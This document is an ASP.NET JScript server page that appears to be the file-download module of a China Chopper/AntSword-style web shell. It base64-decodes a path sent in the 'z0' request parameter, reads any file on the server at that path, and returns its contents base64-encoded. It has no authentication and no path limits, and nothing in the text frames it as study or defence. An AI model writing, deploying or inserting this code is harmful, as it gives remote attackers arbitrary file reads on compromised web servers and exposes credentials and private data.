<%

function GetCurrentCharset() : String {
    var charset : String = System.Web.HttpContext.Current.Response.Charset;
    
    if (charset == null || charset == "") {
        switch (System.Web.HttpContext.Current.Session.CodePage) {
            case 65001: charset = "utf-8"; break;
            case 1252:  charset = "windows-1252"; break;
            case 936:   charset = "gb2312"; break;
            case 950:   charset = "big5"; break;
            case 1251:  charset = "windows-1251"; break;
            default:    charset = "utf-8"; break;
        }
    }
    return charset;
}

function Base64Decode(str : String) : String {
    try {
        var encBytes : Byte[] = System.Convert.FromBase64String(str);
        var encoding : System.Text.Encoding = System.Text.Encoding.GetEncoding(GetCurrentCharset());
        return encoding.GetString(encBytes);
    } catch(e) {
        return "";
    }
}

function FileToBase64(filePath : String) : String {
    try {
        var fileBytes : Byte[] = System.IO.File.ReadAllBytes(filePath);
        return System.Convert.ToBase64String(fileBytes);
    } catch(e) {
        return "ERROR://" + e.message;
    }
}

var z0 : String = Request.Item["z0"];

if (z0 == null || z0.Trim() == "") {
    Response.Write("ERROR://No parameter received.");
} else {
    var file_path : String = Base64Decode(z0);
    
    if (file_path == "") {
        Response.Write("ERROR://Invalid base64 string.");
    } else {
        try {
            if (!System.IO.File.Exists(file_path)) {
                Response.Write("ERROR://Cannot find file: " + file_path);
            } else {
                var result : String = FileToBase64(file_path);
                Response.Write(result);
            }
        } catch(e) {
            Response.Write("ERROR://" + e.message);
        }
    }
}

%>